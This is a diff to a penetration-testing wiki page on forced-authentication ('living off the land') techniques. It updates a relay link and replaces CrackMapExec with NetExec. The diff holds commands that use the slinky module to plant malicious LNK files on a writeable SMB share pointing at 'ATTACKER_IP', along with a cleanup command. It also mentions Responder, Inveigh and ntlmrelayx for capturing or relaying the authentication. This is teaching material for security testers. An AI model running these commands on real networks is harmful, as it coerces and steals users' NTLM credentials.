@@ -14,7 +14,7 @@ There are multiple "living off the land" techniques that can be used to force au
 
 ## Practice
 
-Those techniques will usually generate outgoing traffic on SMB or HTTP, hence requiring the attacker to set up an SMB or HTTP server to [capture](../ntlm/capture.md) or [relay](../../../ad/movement/mitm-and-coerced-authentications/broken-reference/) the authentication (e.g. using tools like [Responder](https://github.com/SpiderLabs/Responder) (Python), [Inveigh](https://github.com/Kevin-Robertson/Inveigh) (Powershell), [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) (Python) or [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell)).
+Those techniques will usually generate outgoing traffic on SMB or HTTP, hence requiring the attacker to set up an SMB or HTTP server to [capture](../ntlm/capture.md) or [relay](../ntlm/relay.md) the authentication (e.g. using tools like [Responder](https://github.com/SpiderLabs/Responder) (Python), [Inveigh](https://github.com/Kevin-Robertson/Inveigh) (Powershell), [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) (Python) or [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell)).
 
 ### Command execution
 
@@ -138,14 +138,14 @@ $lnk.Save()
 * LNK files can be mixed with some HTA: [LNK HTA Polyglot](https://hatching.io/blog/lnk-hta-polyglot/)
 {% endhint %}
 
-[CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python) can be used to automatically push LNK files to a writeable share.
+[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can be used to automatically push LNK files to a writeable share.
 
 ```bash
 # Creation & upload
-cme smb "target" -d "domain" -u "user" -p "password" -M slinky -O NAME="SHARE" SERVER="ATTACKER_IP"
+nxc smb "target" -d "domain" -u "user" -p "password" -M slinky -O NAME="SHARE" SERVER="ATTACKER_IP"
 
 # Cleanup
-cme smb "target" -d "domain" -u "user" -p "password" -M slinky -O NAME="SHARE" SERVER="ATTACKER_IP" CLEANUP=True
+nxc smb "target" -d "domain" -u "user" -p "password" -M slinky -O NAME="SHARE" SERVER="ATTACKER_IP" CLEANUP=True
 ```
 {% endtab %}
 
